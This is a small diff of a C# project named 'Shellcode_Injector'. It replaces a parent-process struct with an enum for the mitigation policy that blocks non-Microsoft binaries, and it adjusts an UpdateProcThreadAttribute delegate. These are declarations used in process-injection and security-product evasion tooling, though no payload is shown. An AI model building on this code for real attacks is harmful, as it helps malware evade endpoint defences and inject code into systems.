@@ -55,13 +55,12 @@ namespace Shellcode_Injector
             public IntPtr lpDummy;
         }
 
-        // PARENT_PROCESS
-        public struct PPROC
+        //PROCESS_CREATION_MITIGATION_POLICY
+        public enum MitigationOptions : long
         {
-            public IntPtr hParentProcess;
-            public IntPtr hConsole;
+            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000L,
         }
-
+ 
         // STARTUP_INFORMATION
         [StructLayout(LayoutKind.Sequential)]
         public struct SIN
@@ -162,7 +161,7 @@ namespace Shellcode_Injector
 
         //UpdateProcThreadAttribute - IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
         //IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize
-        public delegate bool UPTA(IntPtr lpatt, uint dflag, IntPtr att, ref PPROC lval, IntPtr size, IntPtr pval, IntPtr rsize);
+        public delegate bool UPTA(IntPtr lpatt, uint dflag, IntPtr att, IntPtr lval, IntPtr size, IntPtr pval, IntPtr rsize);
 
         //DeleteProcThreadAttributeList - IntPtr lpAttributeList
         public delegate void DPTA(IntPtr lpatt);
